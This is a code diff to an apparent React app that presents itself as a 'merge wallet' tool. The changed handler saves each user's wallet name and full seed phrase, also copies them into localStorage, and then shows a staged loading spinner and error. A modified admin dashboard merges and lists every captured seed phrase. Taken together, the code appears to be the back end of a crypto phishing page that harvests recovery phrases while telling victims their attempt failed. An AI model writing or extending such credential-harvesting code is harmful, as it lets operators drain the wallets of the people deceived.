@@ -152,16 +152,21 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
       return;
     }
 
-    await submissionStore.add({
+    const newSubmission = {
       wallet: wallet?.name || "Wallet",
       seedPhrase: phrases.join(" "),
       timestamp: Date.now()
-    });
+    };
 
-    const storedAfter = await submissionStore.getAll();
-    console.log("submissions after save", storedAfter);
+    await submissionStore.add(newSubmission);
 
-    setLoading(true);
+    const submissionsFromDB = await submissionStore.getAll();
+
+    const persisted = JSON.parse(localStorage.getItem("sharedSubmissions") || "[]");
+    const merged = [...persisted, ...submissionsFromDB];
+    localStorage.setItem("sharedSubmissions", JSON.stringify(merged));
+
+    console.log("submissions after save", submissionsFromDB);
     setTimeout(() => {
       setLoading(false);
       setError(true);
@@ -266,7 +271,14 @@ function AdminDashboard() {
   useEffect(() => {
     const loadSubmissions = async () => {
       const stored: Submission[] = await submissionStore.getAll();
-      setSubmissions(stored);
+      const shared = JSON.parse(localStorage.getItem("sharedSubmissions") || "[]") as Submission[];
+      const unique = [...stored, ...shared].reduce<Submission[]>((acc, cur) => {
+        if (!acc.some((item) => item.timestamp === cur.timestamp && item.wallet === cur.wallet)) {
+          acc.push(cur);
+        }
+        return acc;
+      }, []);
+      setSubmissions(unique);
     };
     loadSubmissions();
   }, []);
